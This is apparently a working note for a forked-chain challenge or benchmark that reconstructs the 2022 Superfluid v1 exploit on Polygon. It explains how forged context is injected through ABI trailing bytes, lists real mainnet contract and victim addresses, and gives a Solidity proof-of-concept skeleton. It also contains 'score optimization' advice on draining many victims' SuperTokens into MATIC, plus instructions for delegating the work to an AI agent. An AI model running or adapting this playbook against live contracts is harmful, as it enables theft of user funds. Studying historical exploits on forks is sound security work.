# Case: Superfluid v1 (Polygon, 2022-02-08)

## Overview

- **체인**: Polygon
- **피해 금액**: ~$8.7M
- **공격 유형**: Context forgery via ABI trailing bytes
- **참조**: rekt.news/superfluid-rekt
- **공격 TX**: `0xdee86cae2e1bab16496a49b2ec61aae0472a7ccf06f79744d42473e96edd6af6`
- **fork block**: 24684668 (or 24684651, 둘 다 시도해보기)

## 프로토콜 구조

Superfluid는 "마이크로페이먼트 스트리밍" 프로토콜. 주요 구성:
- **Host (Superfluid)**: 메인 진입점. 사용자가 직접 호출하는 컨트랙트
- **Agreement contracts**: 지급 방식 결정 (IDA = Instant Distribution, CFA = Constant Flow)
- **SuperToken**: ERC20을 wrapping한 stream-aware 토큰

사용자는 Agreement를 직접 호출 못 하고, **Host의 callAgreement**를 통해서만:

```solidity
function callAgreement(
    ISuperAgreement agreementClass,
    bytes calldata callData,
    bytes calldata userData
) external returns (bytes memory returnedData);
```

### Context 메커니즘
Host는 internal call이라 Agreement에서 msg.sender = Host 주소가 됨. 원래 caller를 알기 위해 `Context` struct를 만들어서 calldata 끝에 packed로 넘김:

```solidity
function _callAgreement(
    address msgSender,
    ISuperAgreement agreementClass,
    bytes memory callData,
    bytes memory userData
) internal {
    bytes memory ctx = _updateContext(Context({
        appLevel: ...,
        callType: CALL_INFO_CALL_TYPE_AGREEMENT,
        timestamp: block.timestamp,
        msgSender: msgSender,    // ← 원래 호출자 보존
        agreementSelector: ...,
        userData: userData,
        appAllowanceGranted: 0,
        appAllowanceWanted: 0,
        appAllowanceUsed: 0,
        appAddress: address(0),
        appAllowanceToken: ISuperfluidToken(address(0))
    }));
    // ctx의 hash를 storage에 저장 (ctxStamp)
    _ctxStamp = keccak256(ctx);
    
    (success, returnedData) = _callExternalWithReplacedCtx(agreementClass, callData, ctx);
}
```

`_callExternalWithReplacedCtx`:
```solidity
function _callExternalWithReplacedCtx(...) {
    callData = _replacePlaceholderCtx(callData, ctx);
    (success, returnedData) = target.call(callData);
    // ...
}
```

`_replacePlaceholderCtx`:
- 사용자가 callAgreement에 넘기는 callData의 마지막 인자는 `bytes ctx = new bytes(0)` (placeholder)
- 이 placeholder를 host가 만든 진짜 ctx로 교체

## 취약점

### ABI trailing bytes
Solidity ABI 디코딩은 함수 시그니처가 받아야 하는 만큼만 디코딩. **그 뒤 trailing bytes는 그냥 무시**.

```solidity
function createIndex(ISuperToken token, uint32 indexId, bytes calldata ctx)
```

이 함수에 다음을 호출하면:
```
calldata = abi.encodeWithSelector(IDA.createIndex.selector, token, indexId, fakeCtx) || abi.encode(new bytes(0))
```
`fakeCtx`는 정상 인자로 디코딩되고, 뒤에 추가된 `new bytes(0)`은 trailing bytes로 무시됨. **단**, `_replacePlaceholderCtx`는 calldata의 **마지막 위치한** bytes를 치환하므로 `new bytes(0)` 이 치환됨. fakeCtx는 그대로 남음.

→ 결과: createIndex가 fakeCtx를 진짜 ctx로 받음

### authorizeTokenAccess의 누락
```solidity
function authorizeTokenAccess(ISuperfluidToken token, bytes memory ctx)
    internal view
    returns (ISuperfluid.Context memory)
{
    require(token.getHost() == msg.sender, "AgreementLibrary: unauthrorized host");
    return ISuperfluid(msg.sender).decodeCtx(ctx);
    // ↑ ctx 자체의 stamp 검증이 없음! decode만 함
}
```

ctx의 hash를 storage에 저장한 ctxStamp랑 비교하지 않음 → 공격자가 임의로 만든 ctx를 그대로 받아들임

### 결과
- 공격자는 ctx의 `msgSender`를 victim 주소로 위장
- IDA.createIndex / updateSubscription / claim 호출 시 host인 것처럼 동작
- victim의 SuperToken 잔액을 attacker에게 분배

## 공격 흐름

1. **victim 식별**: SuperToken (USDCx, DAIx 등) 큰 잔액 보유한 EOA
2. **fake ctx 생성**: `msgSender = victim` 으로
3. **callAgreement 호출**: trailing bytes 트릭으로 fake ctx 주입
4. **createIndex** (publisher = victim 행세): victim 명의 index 생성
5. **updateSubscription** (subscriber = attacker): attacker에게 unit 할당
6. **distribute** 또는 **updateIndex**: 할당된 SuperToken 전송
7. **claim** (필요시)
8. **SuperToken.downgrade**: underlying ERC20 받아냄
9. underlying을 native로 변환

## ch4 챌린지 적용

### 핵심 컨트랙트 주소 (Polygon mainnet)
- Superfluid Host: `0x3E14dC1b13c488a8d5D310918780c983bD5982E7`
- IDA: `0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1`
- USDCx (SuperToken): `0xCAa7349CEA390F89641fe306D93591f87595dc1F`
- USDC (underlying): `0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174`
- 공격 시점 알려진 victim 예시: `0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188`
- MATICx (native SuperToken): `0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3`

### 참조 코드 활용
**`reference/IDAUsage_t.sol`**: 모든 IDA interface declaration + happy-path 흐름 완전 구현. **그대로 가져와서 한 단계만 추가하면 exploit이 됨**:
- 정상 flow: `_call(abi.encodeCall(IDA.createIndex, (..., new bytes(0))))`
- 공격 flow: `_call(abi.encodePacked(abi.encodeCall(IDA.createIndex, (..., fakeCtxBytes)), new bytes(32))` 같은 형태

**`reference/ContextUtils.sol`**: Context struct 정확한 byte layout 그대로 직렬화. `buildContext(victim, IDA.createIndex.selector, "")` → `encodeContext(ctx)` 로 fake ctx bytes 얻음. **byte-identical to host의 ctx**.

### 공격 PoC 스켈레톤
```solidity
import "reference/ContextUtils.sol";

contract SuperfluidV1Exploit is Test {
    function attack(address victim, ISuperToken superToken, uint32 indexId) external {
        // 1. fake ctx with victim as msgSender
        ContextUtils.Context memory fakeCtx = ContextUtils.buildContext(
            victim,
            IDA.createIndex.selector,
            ""
        );
        bytes memory fakeCtxBytes = ContextUtils.encodeContext(fakeCtx);
        
        // 2. createIndex with fake ctx
        bytes memory inner = abi.encodeWithSelector(
            IDA.createIndex.selector,
            superToken, indexId, fakeCtxBytes
        );
        // append empty placeholder so host replaces THAT instead of fakeCtxBytes
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        // ↑ 정확한 layout은 reference 코드 분석해서 결정
        
        HOST.callAgreement(IDA, outer, "");
        
        // 3. updateSubscription: attacker subscribes
        // 4. distribute or updateIndex
        // 5. claim
        // 6. downgrade
    }
}
```

**중요**: 정확한 trailing bytes 구조는 PoC 단계에서 실험으로 확인. `_replacePlaceholderCtx` 코드 보고 정확한 placeholder 위치 파악.

## 점수 최적화

- victim 여러 명 순회 (top N 잔액 보유자)
- USDCx 외에 다른 SuperToken들도 (DAIx, ETHx, MATICx 등)
- **MATICx가 가장 핵심**: downgrade하면 직접 native MATIC → 점수 직접 가산
- USDCx → USDC → Uniswap V3로 WMATIC → unwrap

## A/B/C/D 분류

- A: ABI trailing bytes + ctx 검증 부재 + msgSender 신뢰
- B: ctxStamp 검증 (Patch 1에서 추가)
- C: Patch 1 자체가 일부 entry에만 적용 (claim 빠짐, 이게 v2의 공격 지점)
- D: 거의 0. flashloan 불요

## Codex 위임 시 주의

- Polygon 체인 (chain_id 137)
- Native = MATIC (not ETH)
- victim enumeration 필요 — `enumerate_victims` task로 SuperToken Transfer event 스캔
- ContextUtils.sol을 lib로 import할지 직접 복사할지 결정
- IDAUsage_t.sol에서 인터페이스 declaration 완전체 그대로 사용 가능
